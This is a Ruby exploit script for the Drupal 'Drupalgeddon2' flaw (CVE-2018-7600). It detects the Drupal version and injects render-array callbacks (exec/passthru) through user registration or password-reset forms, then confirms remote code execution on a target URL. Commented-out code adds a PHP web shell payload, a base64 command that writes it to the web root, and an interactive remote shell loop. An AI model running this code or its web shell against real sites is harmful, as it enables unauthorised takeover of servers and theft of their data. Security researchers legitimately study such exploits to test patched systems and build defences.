#!/usr/bin/env ruby
#
# [CVE-2018-7600] Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
#
# Authors:
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#


require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'readline'


# Settings - Proxy information (nil to disable)
proxy_addr = nil
proxy_port = 8080


# Settings - General
$useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
# webshell = "s.php"


# Settings - Payload (we could just be happy without this, but we can do better!)
#bashcmd = "<?php if( isset( $_REQUEST[c] ) ) { eval( $_GET[c]) ); } ?>'
# bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
# bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d | tee #{webshell}"


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Function http_request <url> [type] [data]
def http_request(url, type="post", payload="")
  uri = URI(url)
  request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
  request.initialize_http_header({"User-Agent" => $useragent})
  request.body = payload
  return $http.request(request)
end

# Function gen_evil_url <cmd>
def gen_evil_url(evil)
  # PHP function to use (don't forget about disabled functions...)
  phpmethod = $drupalversion.start_with?('8')? "exec" : "passthru"
  # puts "[*] PHP cmd: #{phpmethod}"
  puts "[*] Payload: #{evil}"

  ## Check the version to match the payload
  # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
  if $drupalversion.start_with?('8')
    # Method #1 - Drupal 8, mail, #post_render - response is 200
    url = $target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil

    # Method #2 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
    #url = $target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
  elsif $drupalversion.start_with?('7')
    # Method #3 - Drupal 7, name, #post_render - response is 200
    url = $target + "?q=user/password&name[%23post_render][]=" + phpmethod + "&name[%23type]=markup&name[%23markup]=" + evil
    payload = "form_id=user_pass&_triggering_element_name=name"
  else
    puts "[!] Unsupported Drupal version"
    exit
  end

  # Drupal v7 needs an extra value from a form
  if $drupalversion.start_with?('7')
    response = http_request(url, "post", payload)

    form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
    if form_build_id.empty?
      puts "[!] WARNING: Didn't detect form_build_id"
    else
      puts "[!] form_build_id: " + form_build_id
    end


    url = $target + "?q=file/ajax/name/%23value/" + form_build_id
    payload = "form_build_id=" + form_build_id
  end

  return url, payload
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Quick how to use
if ARGV.empty?
  puts "Usage: ruby drupalggedon2.rb <target> [version]"
  puts "       ruby drupalgeddon2.rb https://example.com"
  puts "       ruby drupalgeddon2.rb https://example.com 7"
  exit
end

# Read in values
$target = ARGV[0]
$drupalversion = if ARGV[1] then ARGV[1] else nil end
$drupalversions = []

# Check input for protocol
if not $target.start_with?('http')
  $target = "http://#{$target}"
end
# Check input for the end
if not $target.end_with?('/')
  $target += "/"
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Banner
puts "[*] --==[::#Drupalggedon2::]==--"
puts "-"*80
puts "[*] Target : #{$target}"
if $drupalversion then puts "[*] Drupal version: #{$drupalversion}" end
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Setup connection
uri = URI($target)
$http = Net::HTTP.new(uri.host, uri.port, proxy_addr, proxy_port)


# Use SSL/TLS if needed
if uri.scheme == "https"
  $http.use_ssl = true
  $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Try and get version
if not $drupalversion
  # Possible URLs
  url = [
    $target + "CHANGELOG.txt",
    $target + "core/CHANGELOG.txt",
    $target + "includes/bootstrap.inc",
    $target + "core/includes/bootstrap.inc",
    $target + "includes/database.inc"
  ]
  # Check all
  url.each do|uri|
    # Check response
    response = http_request(uri,"get")

    if response.code == "200"
      puts "[+] Found  : #{uri} (#{response.code})"

      # Patched already?
      puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"

      # Try and get version from the file contents
      $drupalversion = response.body.match(/Drupal (.*)[, ]/).to_s.slice(/Drupal (.*)[, ]/, 1).to_s.strip

      # If not, try and get it from the URL
      $drupalversion = uri.match(/core/)? "8.x" : "7.x" if $drupalversion.empty?

      # Done!
      break
    elsif response.code == "403"
      puts "[+] Found  : #{uri} (#{response.code})"

      # Get version from URL
      $drupalversion = uri.match(/core/)? "8.x" : "7.x"
    else
      puts "[!] MISSING: #{uri} (#{response.code})"
    end
  end
end


# Feedback
if $drupalversion
  status = $drupalversion.end_with?('x')? "?" : "!"
  puts "[+] Drupal#{status}: #{$drupalversion}"
  $drupalversions = [$drupalversion]
else
  puts "[!] Didn't detect Drupal version"
  puts "[!] Trying Drupal v7.x and v8.x"
  $drupalversions = ["7.x","8.x"]
end
puts "-"*80



# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Generate a random string to see if we can echo it
random = (0...8).map { (65 + rand(26)).chr }.join

# Make a request, testing code execution
$drupalversions.each do|version|
  puts "[+] Attacking version #{version}"
  $drupalversion = version
  url, payload = gen_evil_url("echo #{random}")
  response = http_request(url, "post", payload)
  if response.code == "200" and not response.body.empty?
    #result = JSON.pretty_generate(JSON[response.body])
    result = $drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
    # puts "[+] Result : #{result}"

    if response.body.match(/#{random}/)
      puts "[+] Result : #{result}"
      puts "[+] Target #{$target} seems to be exploitable (Code execution)!"
      exit
    else
      puts "[+] Target #{$target} might to be exploitable?"
    end

  else
    puts "[!] Target #{$target} is NOT exploitable ~ HTTP Response: #{response.code}"
  end
  puts "-"*80
end


# Make a request, try and write to web root
# url, payload = gen_evil_url(bashcmd)
# response = http_post(url, payload)
# if response.code == "200" and not response.body.empty?
#   #result = JSON.pretty_generate(JSON[response.body])
#   result = $drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
#   puts "[+] Result : #{result}"
# else
#   puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
#   exit
# end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Test to see if backdoor is there
# response = http_post("#{$target}#{webshell}", "c=hostname")
# if response.code == "200"
#   puts "[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"
#   puts "-"*80

#   # Get hostname for the prompt
#   hostname = response.body.to_s.strip

#   # Feedback
#   puts "[*] Fake shell:   curl '#{$target}#{webshell}' -d 'c=whoami'"

#   # Stop any CTRL + C action ;)
#   trap("INT", "SIG_IGN")

#   # Forever loop
#   loop do
#     # Get input
#     command = Readline.readline("#{hostname}> ", true)

#     # Exit
#     break if command =~ /exit/

#     # Blank link?
#     next if command.empty?

#     # Send request
#     response = http_post("#{$target}#{webshell}", "c=#{command}")
#     puts response.body
#   end
# else
#   puts "[!] Exploit FAILED ~ Response: #{response.code}"
#   exit
# end
